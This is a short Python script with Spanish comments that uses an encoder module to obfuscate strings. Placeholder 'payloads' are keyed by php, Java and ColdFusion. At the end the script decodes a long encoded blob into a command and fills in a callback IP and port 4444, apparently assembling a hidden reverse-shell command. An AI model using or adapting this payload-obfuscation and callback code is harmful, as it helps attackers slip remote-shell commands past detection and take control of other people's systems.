import lazyencoder_decoder as ed

# Ejemplo con una cadena
input_string = "Hola, Mundo!"
shift_value = 3
substitution_key = "clave"

# Ofuscar la cadena
encoded_string = ed.encode(input_string, shift_value, substitution_key)
print(f"Encoded string: {encoded_string}")

# Desofuscar la cadena
decoded_string = ed.decode(encoded_string, shift_value, substitution_key)
print(f"Decoded string: {decoded_string}")
lhost = rhost = '127.0.0.1'
cmd = 'ls'
# Ejemplo con una lista de cadenas
payloads = {
    "php1": "asdfg",
    "php2": "asfsdf",
    'Java': "asfdsafg')",
    'ColdFusion': "asfdgdsfg"
}

# Ofuscar el diccionario de cadenas
encoded_dict = {key: ed.encode(value, shift_value, substitution_key) for key, value in payloads.items()}
print(f"Encoded dict: {encoded_dict}")

# Desofuscar el diccionario de cadenas
decoded_dict = {key: ed.decode(value, shift_value, substitution_key) for key, value in encoded_dict.items()}
print(f"Decoded dict: {decoded_dict}")
callback_ip = '127.0.0.1'
callback_port = '4444'

command2 = "hU93GCXcyNAgeAHyHp9XNQ1Mi25MGJ1LLCouNJPsgwDrYCvoWfGQhVImq3KnQIQtiB1kztVuWkC3ZX9pfaYhkHPWcES0CU0zHpT0QzQtF2hobORiYCUVE2vwEK50RHr7W2KgeEQmM2rmfLE9Qdl7W2KgeEQmM2rmhU9wkM0sMfWngFQqMZ0nUGDiF2lsXD50OikqrIL0haYfiXusM1ywhVYqK11kOUM5kLJcGK0uPA4zBmS1RnY8QCh7KO19R3ktoZvsPQjihXO9GJWngFQqMZ0bZaYfGHunWuq0CVTxWGYzNQUglCFoaf5ACU5srJewPGDrirIjKJq7hxzpNJD0DGD9PHvRXEhhW2QvNZL0NQ1SlCPoRtKhCQIYsAL0EK0sCLJ4bJ5PX0UOGXTbD29ihB5qIZ5VCVYYrKHwgafmQLX5bNAnOBHxXJiwTmUxGB5nWtKxdwH9WFfwELjeQLFkbNJuPh4rAVZ8NS91kH1WbOOdekjlYWqrh2YsGLXkW2xmLAH9WFPgEK5iFrTmyfFfLAkVIbYuNQveRMP3XJpiXEM0oFYyNQf-PHq7HOSzekYnsAPsNR0eRKh0XEm0OkCzM29rfK5lEYc6OCSRVSruZnbsiSM5kLJcIJWnCU5pMpDqfnLnVdFcbOOzBU0zJ3HwiUXmQMBoztWwhVYqZGYzOVQjirFlcEWzOieqppb0fQn7QMB0atAveQ5LpKTgfQjnmC07GJWxeEsqpqObV2atj2IrIX=="
command = ed.decode(command2, shift_value, substitution_key)
print(f"command {command}")

command = command.format(callback_ip=callback_ip, callback_port=callback_port)
print(f"command {command}")
